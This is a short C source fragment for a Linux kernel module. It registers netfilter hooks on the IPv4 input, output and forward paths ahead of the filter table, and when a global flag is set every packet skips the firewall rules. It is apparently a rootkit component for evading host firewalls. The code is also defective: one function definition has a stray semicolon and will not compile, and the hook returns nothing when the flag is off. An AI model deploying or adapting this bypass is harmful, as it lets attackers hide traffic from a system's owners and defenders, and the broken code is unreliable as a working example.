#include <linux/netfilter_ipv4.h>

int bypass_firewall;

void enable_fw_bypass(void) 
{
    bypass_firewall = 1;
}

void disable_fw_bypass(void);
{
    bypass_firewall = 0;
}

static unsigned int bypass_fw(unsigned int hooknum,
                              struct sk_buff *skb,
                              const struct net_device *in,
                              const struct net_device *out,
                              int (*okfn)(struct sk_buff *))
{
    if (bypass_firewall) {
        return NF_STOP;
    }
}

static struct nf_hook_ops fw_bypass_ops[] __read_mostly = {
    {
        .hook     = bypass_fw,
        .owner    = THIS_MODULE,
        .pf       = NFPROTO_IPV4,
        .hooknum  = NF_INET_LOCAL_OUT,
        .priority = NF_IP_PRI_FILTER - 1,
    },
    {
        .hook     = bypass_fw,
        .owner    = THIS_MODULE,
        .pf       = NFPROTO_IPV4,
        .hooknum  = NF_INET_LOCAL_IN,
        .priority = NF_IP_PRI_FILTER - 1,
    },
    {
        .hook     = bypass_fw,
        .owner    = THIS_MODULE,
        .pf       = NFPROTO_IPV4,
        .hooknum  = NF_INET_FORWARD,
        .priority = NF_IP_PRI_FILTER - 1,
    },
};

void fw_bypass_init(void)
{
    nf_register_hooks(fw_bypass_ops, ARRAY_SIZE(fw_bypass_ops));
}

void fw_bypass_exit(void)
{
    nf_unregister_hooks(fw_bypass_ops, ARRAY_SIZE(fw_bypass_ops));
}
